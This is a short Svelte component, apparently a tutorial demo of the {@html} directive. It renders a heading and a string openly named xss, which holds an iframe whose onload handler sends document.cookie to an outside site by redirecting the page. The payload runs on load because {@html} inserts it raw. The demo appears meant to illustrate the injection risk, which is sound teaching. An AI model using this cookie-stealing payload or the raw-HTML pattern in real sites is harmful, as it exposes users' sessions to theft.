<script>
	let h1 = '<h1>Hello Heropy</h1>';
  let xss = '<iframe onload="document.location=`https://heropy.blog?${document.cookie}`"></iframe>';
</script>

<main>
	{@html h1}
  {@html xss}
</main>

<style>
	main {
		text-align: center;
		padding: 1em;
		max-width: 240px;
		margin: 0 auto;
	}
	h1 {
		color: #ff3e00;
		text-transform: uppercase;
		font-size: 4em;
		font-weight: 100;
	}
	@media (min-width: 640px) {
		main {
			max-width: none;
		}
	}
</style>
